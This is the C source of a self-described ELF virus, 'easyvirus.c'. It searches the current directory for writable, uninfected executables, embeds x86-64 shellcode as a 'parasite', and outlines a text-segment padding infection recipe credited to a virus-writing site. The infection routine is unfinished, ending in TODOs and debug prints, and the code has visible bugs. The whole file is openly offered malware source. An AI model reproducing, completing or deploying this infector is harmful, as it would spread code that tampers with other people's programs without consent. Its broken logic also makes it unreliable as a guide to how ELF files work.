/*
 * easyvirus.c
 *
 *  Created on: Dec 20, 2015
 *      Author: klaus
 */
#define _GNU_SOURCE
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <elf.h>
#include <unistd.h>
#include <stdlib.h>

#define MESSAGE "Hey! I am an elf virus ;-)!\n"
#define SMESSAGE (sizeof(MESSAGE)-1)
#define TMP_FILE "/tmp/infected-0926457"

char parasite[] =
        "\x68\x01\x01\x01\x01\x81\x34\x24\x2c\x28\x20\x0b\x48\xb8\x20\x76"
                "\x69\x72\x75\x73\x20\x3b\x50\x48\xb8\x6d\x20\x61\x6e\x20\x65\x6c"
                "\x66\x50\x48\xb8\x48\x65\x79\x21\x20\x49\x20\x61\x50\x6a\x01\x5f"
                "\x48\x89\xe6\x6a\x1c\x5a\x6a\x01\x58\x0f\x05\x31\xff\x6a\x3c\x58"
                "\x0f\x05";

#define PARA_LEN sizeof(parasite)

int is_already_infected(char *file_name);
int is_elf(char *file_name);
void infect_binary(char *file_name);
int infect64(char *data, int size);

int main(int argc, char **argv) {
    DIR *dirstream;
    struct dirent *dir_entry;
    char last_file_name[256];

    dirstream = opendir(".");

    if (dirstream == NULL) {
        perror("Couldn't get directory");
        exit(2);
    }

    bzero(last_file_name, sizeof(last_file_name));

    while ((dir_entry = readdir(dirstream)) != NULL) {
        // Test if file is not current or parent dir or self
        if (!strcmp(dir_entry->d_name, "."))
            continue;
        if (!strcmp(dir_entry->d_name, ".."))
            continue;
        if (!strcmp(dir_entry->d_name, basename(argv[0])))
            continue;
        // Test for read and write permission
        if (access(dir_entry->d_name, R_OK | W_OK) != 0)
            continue;
        // Test if file is a ELF
        if (!is_elf(dir_entry->d_name))
            continue;
        // Test if file is not already infected
        if (is_already_infected(dir_entry->d_name))
            continue;

        strncpy(last_file_name, dir_entry->d_name, sizeof(last_file_name));
        printf("%s\n", dir_entry->d_name);
    }

    closedir(dirstream);

    // If there is no infectable file, exit
    if (last_file_name == NULL)
        return 0;

    // Infect binary
    infect_binary(last_file_name);
}

int is_already_infected(char *file_name) {
    FILE *fp;
    long size;
    char *buffer;

    fp = fopen(file_name, "rb");

    if (fp == NULL) {
        perror("File open error");
        exit(2);
    }

    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);

    buffer = (char *) malloc(size);
    if (buffer == NULL) {
        perror("Memory allocation error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    if (fread(buffer, 1, size, fp) != size) {
        perror("File reading error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    int ret = memmem(buffer, size, MESSAGE, SMESSAGE) != NULL;

    fclose(fp);
    free(buffer);
    return ret;
}

int is_elf(char *file_name) {
    FILE *fp;
    fp = fopen(file_name, "rb");

    if (fp == NULL) {
        perror("File open error");
        exit(2);
    }

    Elf32_Ehdr ehdr;

    int n = fread(&ehdr, 1, sizeof(Elf32_Ehdr), fp);

    // Check if file is as least large enough for the 32 bit ELF header
    if (n != sizeof(Elf32_Ehdr)) {
        fclose(fp);
        return 0;
    }

    // Check if the first few bytes match the magic string
    if (memcmp(&ehdr, ELFMAG, SELFMAG) != 0) {
        fclose(fp);
        return 0;
    }

    // Check if really an executable of shared object library
    if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) {
        fclose(fp);
        return 0;
    }

    fclose(fp);
    return 1;
}

/**
 * Infect binary
 */
void infect_binary(char *file_name) {
    FILE *fp;
    long size;
    char *buffer;
    unsigned char is_64bit = 0;

    fp = fopen(file_name, "r+b");

    if (fp == NULL) {
        perror("File open error");
        exit(2);
    }

    /*
     * Read the whole file into a buffer
     */
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);

    buffer = (char *) malloc(size);
    if (buffer == NULL) {
        perror("Memory allocation error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    if (fread(buffer, 1, size, fp) != size) {
        perror("File reading error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    /*
     * Fetch some information in advance
     */
    // Find out if it's a 32 bit or 64 bit binary
    is_64bit = buffer[EI_CLASS] == ELFCLASS64;
    int ret = 1;

    if (is_64bit) {
        ret = infect64(buffer, size);
    } else {
        perror("Not implemented for 32 bit binaries");
    }

    if (ret) {
        ;
    }

    free(buffer);
    fclose(fp);
}

int infect64(char *data, int size) {
    long page_size = sysconf(_SC_PAGESIZE);

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *) data;
    Elf64_Shdr *shdr;
    Elf64_Phdr *phdr;
    int i;
    int offset, oshoff, pos;
    int evaddr;
    int slen, plen;
    int fd, od;
    char *sdata, *pdata, *ptr;
    char idata[page_size];
    char tmpfilename[] = TMP_FILE;
//    struct stat stat;

    /*
     * Source: http://vxheaven.org/lib/vsc01.html
     * Receipt:
     * Increase p_shoff by PAGE_SIZE in the ELF header
     * Patch the insertion code (parasite) to jump to the entry point (original)
     * Locate the text segment program header
     *   Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
     *   Increase p_filesz by account for the new code (parasite)
     *   Increase p_memsz to account for the new code (parasite)
     * For each phdr who's segment is after the insertion (text segment)
     *   increase p_offset by PAGE_SIZE
     * For the last shdr in the text segment
     *   increase sh_len by the parasite length
     * For each shdr who's section resides after the insertion
     *   Increase sh_offset by PAGE_SIZE
     * Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
     */

    ptr = data;

    /*
     * TODO: Patch the insertion code (parasite) to jump to the entry point (original)
     */
    printf("Parasite length: %li, "
            "Host entry point index: %i, "
            "Entry point offset: %i"
            "\n",
    PARA_LEN, 0, 0);

    /*
     * Locate the text segment program header
     */
    offset = 0;

    for (phdr = (Elf64_Phdr *) ptr + ehdr->e_phoff;
            phdr < (Elf64_Phdr *) (ptr + ehdr->e_phoff + (sizeof(*phdr) * ehdr->e_phnum));
            phdr++) {
        printf("Offset: %ld", phdr->p_offset);
    }

    // TODO

    return 1;
}
